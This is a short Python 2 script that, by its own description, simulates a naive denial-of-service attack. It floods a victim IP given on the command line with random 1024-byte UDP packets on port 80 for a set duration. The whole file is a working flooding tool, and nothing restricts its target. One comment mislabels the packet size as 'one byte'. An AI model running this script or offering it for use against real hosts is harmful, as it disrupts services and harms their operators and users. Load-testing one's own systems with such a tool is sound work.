"""
UDP flooder to simulate aggressive naive DOS attack
Gets the victim IP as an argument
Can flood any port for any duration, just change the @port and @duration variables
"""
import time
import socket
import random

import sys

# GLOBALS
victim = sys.argv[1]

client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random._urandom(1024)  # 1024 represents one byte to the server

vport = 80
duration = 2
timeout = time.time() + duration
sent = 0

# FLOOD
while True:
    if time.time() > timeout:
        break

    client.sendto(bytes, (victim, vport))
    sent += 1

    if sent % 10000 == 0:
        print "%s packets were sent to %s:%s " % (sent, victim, vport)
